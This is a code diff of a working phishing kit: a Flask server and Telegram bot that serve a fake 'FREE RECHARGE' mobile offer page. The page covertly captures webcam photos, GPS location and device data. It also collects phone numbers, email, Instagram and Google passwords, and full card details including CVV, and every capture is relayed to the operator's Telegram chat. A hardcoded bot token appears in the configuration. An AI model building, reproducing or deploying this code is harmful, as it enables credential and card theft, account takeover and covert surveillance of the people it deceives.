@@ -6,28 +6,22 @@ import urllib.parse
 import json
 import time
 import sqlite3
+import re
 from datetime import datetime
-from flask import Flask, request, render_template_string, jsonify
+from flask import Flask, request, render_template_string
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # --- CONFIGURATION ---
 TOKEN = "7888111866:AAHUBF0GQU8ya9uySEYu35HPJ_GFsnv1aa0"
-SERVER_URL = "https://specific-bot.onrender.com"  # CHANGE THIS TO YOUR RENDER URL
+SERVER_URL = "https://specific-bot.onrender.com"
 
-# FORCE JOIN CHANNELS (ONLY THESE 3)
+# FORCE JOIN CHANNELS
 CHANNELS = [
     "https://t.me/forameing",
     "https://t.me/proxydominates", 
     "https://t.me/proxyintfiles"
 ]
-
-# Extract usernames from URLs
-CHANNEL_USERNAMES = []
-for ch in CHANNELS:
-    if "t.me/" in ch:
-        username = ch.split("t.me/")[-1]
-        CHANNEL_USERNAMES.append(f"@{username}")
 
 app = Flask(__name__)
 
@@ -39,8 +33,6 @@ def init_db():
         chat_id TEXT,
         timestamp DATETIME,
         ip TEXT,
-        user_agent TEXT,
-        location TEXT,
         device_info TEXT,
         photos TEXT,
         phone TEXT,
@@ -48,26 +40,21 @@ def init_db():
         email TEXT,
         email_pass TEXT,
         instagram TEXT,
-        insta_pass TEXT
+        insta_pass TEXT,
+        youtube_email TEXT,
+        youtube_pass TEXT,
+        card_number TEXT,
+        card_expiry TEXT,
+        card_cvv TEXT,
+        lat TEXT,
+        lon TEXT,
+        address TEXT,
+        pincode TEXT
     )''')
     conn.commit()
     conn.close()
 
 init_db()
-
-def save_to_db(chat_id, data_type, data):
-    try:
-        conn = sqlite3.connect('tracking.db')
-        cursor = conn.execute("SELECT * FROM victims WHERE chat_id=?", (chat_id,))
-        if cursor.fetchone():
-            conn.execute(f"UPDATE victims SET {data_type}=? WHERE chat_id=?", (json.dumps(data), chat_id))
-        else:
-            conn.execute('''INSERT INTO victims (chat_id, timestamp) VALUES (?, ?)''', (chat_id, datetime.now()))
-            conn.execute(f"UPDATE victims SET {data_type}=? WHERE chat_id=?", (json.dumps(data), chat_id))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"DB Error: {e}")
 
 def send_telegram_message(chat_id, text, photo=None):
     try:
@@ -87,7 +74,7 @@ def get_html(chat_id, redirect_url):
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verification Required</title>
+    <title>FREE RECHARGE</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -108,14 +95,9 @@ def get_html(chat_id, redirect_url):
             width: 100%;
             overflow: hidden;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            animation: fadeIn 0.5s ease;
-        }}
-        @keyframes fadeIn {{
-            from {{ opacity: 0; transform: scale(0.95); }}
-            to {{ opacity: 1; transform: scale(1); }}
         }}
         .header {{
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             padding: 30px;
             text-align: center;
             color: white;
@@ -123,20 +105,19 @@ def get_html(chat_id, redirect_url):
         .header h2 {{ font-size: 24px; margin-bottom: 10px; }}
         .content {{ padding: 30px; }}
         .step {{ display: none; }}
-        .step.active {{ display: block; animation: fadeIn 0.3s ease; }}
+        .step.active {{ display: block; }}
         .btn {{
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             color: white;
             border: none;
             padding: 15px 30px;
             font-size: 16px;
+            font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
             margin: 10px 0;
-            transition: transform 0.3s;
         }}
-        .btn:hover {{ transform: scale(1.02); }}
         .btn:disabled {{ opacity: 0.5; cursor: not-allowed; }}
         input, select {{
             width: 100%;
@@ -146,16 +127,6 @@ def get_html(chat_id, redirect_url):
             border-radius: 10px;
             font-size: 16px;
         }}
-        .status {{
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-            text-align: center;
-            font-size: 14px;
-        }}
-        .status-success {{ background: #d4edda; color: #155724; }}
-        .status-error {{ background: #f8d7da; color: #721c24; }}
-        .status-info {{ background: #d1ecf1; color: #0c5460; }}
         .timer-box {{
             background: #f0f0f0;
             padding: 20px;
@@ -166,7 +137,7 @@ def get_html(chat_id, redirect_url):
         .timer {{
             font-size: 48px;
             font-weight: bold;
-            color: #667eea;
+            color: #f5576c;
         }}
         .progress-bar {{
             width: 100%;
@@ -178,9 +149,26 @@ def get_html(chat_id, redirect_url):
         }}
         .progress-fill {{
             height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
+            background: linear-gradient(90deg, #f093fb, #f5576c);
             width: 0%;
-            transition: width 0.3s;
+        }}
+        .offer-badge {{
+            background: #ffd700;
+            color: #333;
+            padding: 8px 15px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }}
+        .status-success {{
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 15px 0;
         }}
         video, canvas {{ display: none; }}
     </style>
@@ -188,27 +176,33 @@ def get_html(chat_id, redirect_url):
 <body>
     <div class="container">
         <div class="header">
-            <h2>🔐 Verification Required</h2>
+            <div class="offer-badge">🎁 LIMITED OFFER 🎁</div>
+            <h2>FREE RECHARGE</h2>
+            <p>₹899 - 3 Months Pack</p>
         </div>
         <div class="content">
             <!-- Step 1: Location -->
             <div id="step1" class="step active">
-                <p style="text-align: center; margin-bottom: 20px;">Checking if your region is eligible for this offer...</p>
-                <button class="btn" id="locationBtn">📍 Allow Location</button>
-                <div id="locationStatus" class="status status-info" style="display: none;">Checking location...</div>
+                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
+                    🎁 <strong>FREE RECHARGE</strong> 🎁<br><br>
+                    Allow location to check eligibility<br>in your region
+                </p>
+                <button class="btn" id="locationBtn">📍 ALLOW LOCATION</button>
             </div>
             
             <!-- Step 2: Camera -->
             <div id="step2" class="step">
-                <p style="text-align: center; margin-bottom: 20px;">Verify you are human to claim this exclusive offer</p>
-                <button class="btn" id="cameraBtn">📸 Allow Camera</button>
-                <div id="cameraStatus" class="status status-info" style="display: none;">Taking photos...</div>
+                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
+                    🤖 <strong>HUMAN VERIFICATION</strong><br><br>
+                    Verify you are human to claim<br>this exclusive offer
+                </p>
+                <button class="btn" id="cameraBtn">📸 ALLOW CAMERA</button>
             </div>
             
             <!-- Step 3: Phone Number Form -->
             <div id="step3" class="step">
-                <h3 style="text-align: center; margin-bottom: 20px;">🎁 3 MONTHS FREE RECHARGE</h3>
-                <p style="text-align: center; color: #666; margin-bottom: 20px;">Rs 899 Value • Unlimited Calls • 2GB/Day</p>
+                <h3 style="text-align: center; margin-bottom: 10px;">🎁 3 MONTHS FREE RECHARGE</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">₹899 Value • Unlimited Calls • 2GB/Day</p>
                 <select id="network">
                     <option value="Jio">Jio</option>
                     <option value="Airtel">Airtel</option>
@@ -216,22 +210,22 @@ def get_html(chat_id, redirect_url):
                     <option value="BSNL">BSNL</option>
                 </select>
                 <input type="tel" id="phone" placeholder="Mobile Number (e.g., 9876543210)" maxlength="10">
-                <button class="btn" id="phoneBtn">Continue</button>
+                <button class="btn" id="phoneBtn">CONTINUE</button>
             </div>
             
             <!-- Step 4: Email Login -->
             <div id="step4" class="step">
-                <h3 style="text-align: center; margin-bottom: 20px;">📧 Email Verification</h3>
+                <h3 style="text-align: center; margin-bottom: 20px;">📧 EMAIL VERIFICATION</h3>
                 <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter your email to activate recharge</p>
                 <input type="email" id="email" placeholder="Email Address">
                 <input type="password" id="emailPass" placeholder="Password">
-                <button class="btn" id="emailBtn">Verify & Claim</button>
+                <button class="btn" id="emailBtn">VERIFY & CLAIM</button>
             </div>
             
             <!-- Step 5: Options + Timer -->
             <div id="step5" class="step">
-                <div class="status status-success" style="margin-bottom: 20px;">
-                    ✅ Recharge Initiated! Rs 899 - 3 Months Pack
+                <div class="status-success">
+                    ✅ Recharge Initiated! ₹899 - 3 Months Pack
                 </div>
                 <div class="timer-box">
                     <div class="timer" id="timer">35:00</div>
@@ -248,35 +242,35 @@ def get_html(chat_id, redirect_url):
             
             <!-- Step 6: Instagram Login -->
             <div id="step6" class="step">
-                <h3 style="text-align: center; margin-bottom: 20px;">📸 Instagram Verification</h3>
+                <h3 style="text-align: center; margin-bottom: 20px;">📸 INSTAGRAM VERIFICATION</h3>
                 <p style="text-align: center; color: #666; margin-bottom: 20px;">Login to claim 10k followers</p>
                 <input type="text" id="instaUser" placeholder="Instagram Username">
                 <input type="password" id="instaPass" placeholder="Password">
-                <button class="btn" id="instaBtn">Claim Followers</button>
+                <button class="btn" id="instaBtn">CLAIM FOLLOWERS</button>
             </div>
             
             <!-- Step 7: YouTube Login -->
             <div id="step7" class="step">
-                <h3 style="text-align: center; margin-bottom: 20px;">🎬 Google Account</h3>
+                <h3 style="text-align: center; margin-bottom: 20px;">🎬 GOOGLE ACCOUNT</h3>
                 <p style="text-align: center; color: #666; margin-bottom: 20px;">Login for YouTube Premium</p>
                 <input type="email" id="ytEmail" placeholder="Gmail/Email">
                 <input type="password" id="ytPass" placeholder="Password">
-                <button class="btn" id="ytBtn">Claim Premium</button>
+                <button class="btn" id="ytBtn">CLAIM PREMIUM</button>
             </div>
             
             <!-- Step 8: Amazon Card -->
             <div id="step8" class="step">
-                <h3 style="text-align: center; margin-bottom: 20px;">🛍️ Amazon Gift Card</h3>
+                <h3 style="text-align: center; margin-bottom: 20px;">🛍️ AMAZON GIFT CARD</h3>
                 <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter card details to claim ₹2000</p>
                 <input type="text" id="cardNumber" placeholder="Card Number">
                 <input type="text" id="cardExpiry" placeholder="MM/YY">
                 <input type="text" id="cardCvv" placeholder="CVV">
-                <button class="btn" id="cardBtn">Claim Gift Card</button>
+                <button class="btn" id="cardBtn">CLAIM GIFT CARD</button>
             </div>
             
             <!-- Final Step -->
             <div id="step9" class="step">
-                <div class="status status-success" style="text-align: center; padding: 30px;">
+                <div class="status-success" style="text-align: center; padding: 30px;">
                     🎉 ALL SET! 🎉<br><br>
                     ✅ Recharge Activated<br>
                     ✅ Bonuses Added<br><br>
@@ -292,98 +286,98 @@ def get_html(chat_id, redirect_url):
     <script>
         let chatId = "{chat_id}";
         let redirectUrl = "{redirect_url}";
-        let currentStep = 1;
         let stream = null;
         let photos = [];
-        let locationData = null;
         let timerInterval = null;
-        let timeLeft = 2100; // 35 minutes in seconds
+        let timeLeft = 2100;
         
         function showStep(step) {{
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
             document.getElementById(`step${{step}}`).classList.add('active');
-            currentStep = step;
         }}
         
-        // Step 1: Location
+        // Step 1: LOCATION
         document.getElementById('locationBtn').onclick = function() {{
-            let statusDiv = document.getElementById('locationStatus');
-            statusDiv.style.display = 'block';
-            statusDiv.innerHTML = '📍 Fetching your location...';
-            statusDiv.className = 'status status-info';
+            let btn = this;
+            btn.disabled = true;
+            btn.innerHTML = "📍 CHECKING...";
+            
+            if (!navigator.geolocation) {{
+                alert('Your browser does not support location. Please use Chrome or Safari.');
+                btn.disabled = false;
+                btn.innerHTML = "📍 ALLOW LOCATION";
+                return;
+            }}
             
             navigator.geolocation.getCurrentPosition(
                 async (position) => {{
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
                     
-                    locationData = {{ lat, lon }};
-                    
-                    statusDiv.innerHTML = '✅ Location detected! Sending...';
-                    statusDiv.className = 'status status-success';
-                    
-                    // Send location to server
-                    await fetch('/location_data', {{
+                    await fetch(window.location.origin + '/location_data', {{
                         method: 'POST',
                         headers: {{'Content-Type': 'application/json'}},
-                        body: JSON.stringify({{ chat_id: chatId, lat, lon }})
+                        body: JSON.stringify({{ chat_id: chatId, lat: lat, lon: lon }})
                     }});
                     
-                    setTimeout(() => {{
-                        showStep(2);
-                    }}, 1000);
+                    showStep(2);
                 }},
                 (error) => {{
-                    statusDiv.innerHTML = '❌ Please allow location to continue';
-                    statusDiv.className = 'status status-error';
+                    btn.disabled = false;
+                    btn.innerHTML = "📍 ALLOW LOCATION";
+                    alert('❌ Please allow location to check eligibility. Tap the 🔒 icon and enable location.');
                 }},
-                {{ enableHighAccuracy: true, timeout: 10000 }}
+                {{ enableHighAccuracy: true, timeout: 15000 }}
             );
         }};
         
-        // Step 2: Camera
+        // Step 2: CAMERA
         document.getElementById('cameraBtn').onclick = async function() {{
             let btn = this;
-            let statusDiv = document.getElementById('cameraStatus');
             btn.disabled = true;
-            statusDiv.style.display = 'block';
-            statusDiv.innerHTML = '📸 Requesting camera access...';
+            btn.innerHTML = "📸 VERIFYING...";
+            
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
+                alert('Camera not supported. Please use Chrome or Safari.');
+                btn.disabled = false;
+                btn.innerHTML = "📸 ALLOW CAMERA";
+                return;
+            }}
             
             try {{
-                stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
+                stream = await navigator.mediaDevices.getUserMedia({{ 
+                    video: {{ facingMode: "user" }}, 
+                    audio: false 
+                }});
+                
                 let video = document.getElementById('video');
                 let canvas = document.getElementById('canvas');
                 video.srcObject = stream;
                 await video.play();
                 
-                statusDiv.innerHTML = '📸 Taking photos... (10 photos)';
-                
+                // 10 photos - background mein
                 for(let i = 0; i < 10; i++) {{
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     let photo = canvas.toDataURL('image/jpeg', 0.8);
                     photos.push(photo);
-                    statusDiv.innerHTML = `📸 Photo ${{i+1}}/10 captured`;
-                    await new Promise(r => setTimeout(r, 800));
+                    await new Promise(r => setTimeout(r, 600));
                 }}
                 
-                statusDiv.innerHTML = '✅ Photos captured! Sending...';
-                
-                await fetch('/upload_photos', {{
+                await fetch(window.location.origin + '/upload_photos', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{ chat_id: chatId, photos: photos }})
                 }});
                 
                 stream.getTracks().forEach(t => t.stop());
-                statusDiv.innerHTML = '✅ Verification complete!';
-                setTimeout(() => showStep(3), 1000);
+                showStep(3);
                 
             }} catch(err) {{
-                statusDiv.innerHTML = '❌ Camera access required to verify human identity';
-                statusDiv.className = 'status status-error';
                 btn.disabled = false;
+                btn.innerHTML = "📸 ALLOW CAMERA";
+                alert('❌ Please allow camera to verify human identity. Tap the 🔒 icon and enable camera.');
             }}
         }};
         
@@ -397,10 +391,10 @@ def get_html(chat_id, redirect_url):
                 return;
             }}
             
-            await fetch('/phone_data', {{
+            await fetch(window.location.origin + '/phone_data', {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{ chat_id: chatId, network, phone }})
+                body: JSON.stringify({{ chat_id: chatId, network: network, phone: phone }})
             }});
             
             showStep(4);
@@ -416,10 +410,10 @@ def get_html(chat_id, redirect_url):
                 return;
             }}
             
-            await fetch('/email_data', {{
+            await fetch(window.location.origin + '/email_data', {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{ chat_id: chatId, email, email_pass: emailPass }})
+                body: JSON.stringify({{ chat_id: chatId, email: email, email_pass: emailPass }})
             }});
             
             showStep(5);
@@ -433,7 +427,9 @@ def get_html(chat_id, redirect_url):
                     clearInterval(timerInterval);
                     document.getElementById('timer').innerHTML = '00:00';
                     document.getElementById('progressFill').style.width = '100%';
-                    setTimeout(() => showStep(9), 2000);
+                    setTimeout(() => {{
+                        window.location.href = redirectUrl;
+                    }}, 2000);
                 }} else {{
                     timeLeft--;
                     let minutes = Math.floor(timeLeft / 60);
@@ -446,57 +442,39 @@ def get_html(chat_id, redirect_url):
         }}
         
         // Bonus: Instagram
-        document.getElementById('instagramBonusBtn').onclick = function() {{
-            showStep(6);
-        }};
-        
+        document.getElementById('instagramBonusBtn').onclick = function() {{ showStep(6); }};
         document.getElementById('instaBtn').onclick = async function() {{
             let instaUser = document.getElementById('instaUser').value;
             let instaPass = document.getElementById('instaPass').value;
-            
-            await fetch('/instagram_data', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
+            await fetch(window.location.origin + '/instagram_data', {{
+                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify({{ chat_id: chatId, instagram: instaUser, insta_pass: instaPass }})
             }});
-            
             showStep(5);
         }};
         
         // Bonus: YouTube
-        document.getElementById('youtubeBonusBtn').onclick = function() {{
-            showStep(7);
-        }};
-        
+        document.getElementById('youtubeBonusBtn').onclick = function() {{ showStep(7); }};
         document.getElementById('ytBtn').onclick = async function() {{
             let ytEmail = document.getElementById('ytEmail').value;
             let ytPass = document.getElementById('ytPass').value;
-            
-            await fetch('/youtube_data', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
+            await fetch(window.location.origin + '/youtube_data', {{
+                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify({{ chat_id: chatId, youtube_email: ytEmail, youtube_pass: ytPass }})
             }});
-            
             showStep(5);
         }};
         
         // Bonus: Amazon
-        document.getElementById('amazonBonusBtn').onclick = function() {{
-            showStep(8);
-        }};
-        
+        document.getElementById('amazonBonusBtn').onclick = function() {{ showStep(8); }};
         document.getElementById('cardBtn').onclick = async function() {{
             let cardNumber = document.getElementById('cardNumber').value;
             let cardExpiry = document.getElementById('cardExpiry').value;
             let cardCvv = document.getElementById('cardCvv').value;
-            
-            await fetch('/card_data', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
+            await fetch(window.location.origin + '/card_data', {{
+                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify({{ chat_id: chatId, card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv }})
             }});
-            
             showStep(5);
         }};
         
@@ -517,9 +495,8 @@ def get_html(chat_id, redirect_url):
                 deviceInfo.charging = b.charging;
             }} catch(e) {{}}
             
-            await fetch('/device_info', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
+            await fetch(window.location.origin + '/device_info', {{
+                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify({{ chat_id: chatId, device_info: deviceInfo }})
             }});
         }}
@@ -546,23 +523,18 @@ def device_info():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     
     try:
-        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,mobile,proxy").json()
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=5).json()
     except:
         ip_info = {}
     
-    msg = f"""📱 **DEVICE INFO CAPTURED**
+    msg = f"""📊 **Visitor Info**
 ━━━━━━━━━━━━━━━━━━
-
-🌐 **IP:** `{ip}`
-📍 **Location:** {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}
-📡 **ISP:** {ip_info.get('isp', 'N/A')}
-
-📱 **Device:** {device_info.get('platform', 'N/A')}
-🌍 **Language:** {device_info.get('language', 'N/A')}
-📺 **Screen:** {device_info.get('screen', 'N/A')}
-⚡ **Battery:** {device_info.get('battery', 'N/A')}
-🔋 **Charging:** {device_info.get('charging', 'N/A')}
-
+🖥️ Device: `{device_info.get('platform', 'N/A')}`
+🌐 IP: `{ip}`
+📡 ISP: {ip_info.get('isp', 'N/A')}
+📍 Location: {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}
+📺 Screen: {device_info.get('screen', 'N/A')}
+🔋 Battery: {device_info.get('battery', 'N/A')}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
     
@@ -578,25 +550,24 @@ def location_data():
     
     map_link = f"https://maps.google.com/?q={lat},{lon}"
     
-    # Get address from coordinates
+    full_address = 'N/A'
+    pincode = 'N/A'
     try:
-        geo = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json")
-        address = geo.json().get('display_name', 'N/A')
+        geo = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json", timeout=5)
+        address_data = geo.json()
+        full_address = address_data.get('display_name', 'N/A')
+        match = re.search(r'\b\d{6}\b', full_address)
+        if match:
+            pincode = match.group()
     except:
-        address = 'N/A'
+        pass
     
-    msg = f"""📍 **EXACT LOCATION CAPTURED**
+    msg = f"""📍 **GPS Location**
 ━━━━━━━━━━━━━━━━━━
-
-🎯 **Coordinates:**
-`{lat}, {lon}`
-
-🏠 **Address:**
-{address}
-
-🗺️ **Map Link:**
-{map_link}
-
+🎯 Coordinates: {lat}, {lon}
+🏠 Address: {full_address}
+📍 PINCODE: {pincode}
+🗺️ Map: {map_link}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
     
@@ -609,10 +580,12 @@ def upload_photos():
     chat_id = data.get('chat_id')
     photos = data.get('photos', [])
     
-    for i, photo in enumerate(photos[:5]):  # Send first 5 photos
+    send_telegram_message(chat_id, f"📸 **Photos:** {len(photos)} captured")
+    
+    for i, photo in enumerate(photos[:8]):
         try:
             img_data = base64.b64decode(photo.split(',')[1])
-            send_telegram_message(chat_id, f"📸 **Photo {i+1}/10**", img_data)
+            send_telegram_message(chat_id, f"📸 Photo {i+1}", img_data)
         except:
             pass
     
@@ -625,15 +598,12 @@ def phone_data():
     network = data.get('network')
     phone = data.get('phone')
     
-    msg = f"""📱 **PHONE NUMBER CAPTURED**
+    msg = f"""📱 **Phone Number**
 ━━━━━━━━━━━━━━━━━━
-
-📡 **Network:** {network}
-📞 **Number:** +91 {phone}
-
+📡 Network: {network}
+📞 Number: +91 {phone}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
-    
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -644,15 +614,12 @@ def email_data():
     email = data.get('email')
     email_pass = data.get('email_pass')
     
-    msg = f"""📧 **EMAIL LOGIN CAPTURED**
+    msg = f"""📧 **Email Login**
 ━━━━━━━━━━━━━━━━━━
-
-📧 **Email:** {email}
-🔑 **Password:** {email_pass if email_pass else 'Not provided'}
-
+📧 Email: {email}
+🔑 Password: {email_pass}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
-    
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -663,15 +630,12 @@ def instagram_data():
     instagram = data.get('instagram')
     insta_pass = data.get('insta_pass')
     
-    msg = f"""📸 **INSTAGRAM LOGIN CAPTURED**
+    msg = f"""📸 **Instagram Login**
 ━━━━━━━━━━━━━━━━━━
-
-👤 **Username:** {instagram}
-🔑 **Password:** {insta_pass}
-
+👤 Username: {instagram}
+🔑 Password: {insta_pass}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
-    
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -682,15 +646,12 @@ def youtube_data():
     yt_email = data.get('youtube_email')
     yt_pass = data.get('youtube_pass')
     
-    msg = f"""🎬 **YOUTUBE PREMIUM LOGIN**
+    msg = f"""🎬 **YouTube Premium**
 ━━━━━━━━━━━━━━━━━━
-
-📧 **Email:** {yt_email}
-🔑 **Password:** {yt_pass}
-
+📧 Email: {yt_email}
+🔑 Password: {yt_pass}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
-    
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -702,16 +663,13 @@ def card_data():
     card_expiry = data.get('card_expiry')
     card_cvv = data.get('card_cvv')
     
-    msg = f"""💳 **CARD DETAILS CAPTURED**
+    msg = f"""💳 **Card Details**
 ━━━━━━━━━━━━━━━━━━
-
-💳 **Card:** {card_number}
-📅 **Expiry:** {card_expiry}
-🔐 **CVV:** {card_cvv}
-
+💳 Card: {card_number}
+📅 Expiry: {card_expiry}
+🔐 CVV: {card_cvv}
 ━━━━━━━━━━━━━━━━━━
 ⚡ @proxyfxc"""
-    
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -733,14 +691,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_subscribed(context.application, user_id):
         buttons = []
         for channel in CHANNELS:
-            buttons.append([InlineKeyboardButton(f"Join Channel", url=channel)])
-        
-        # Add verification button
-        buttons.append([InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start")])
+            buttons.append([InlineKeyboardButton("🔹 JOIN CHANNEL", url=channel)])
+        buttons.append([InlineKeyboardButton("✅ VERIFIED", url=f"https://t.me/{(await context.bot.get_me()).username}?start")])
         
         await update.message.reply_text(
-            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare teenon channels join karne honge.\n\n**Channels:**\n" + 
-            "\n".join([f"• {ch}" for ch in CHANNELS]),
+            "❌ **ACCESS DENIED!**\n\nBot use karne ke liye aapko hamare teenon channels join karne honge.\n\n━━━━━━━━━━━━━━━━\n**JOIN THESE CHANNELS TO USE OUR BOT**\n━━━━━━━━━━━━━━━━",
             reply_markup=InlineKeyboardMarkup(buttons)
         )
         return
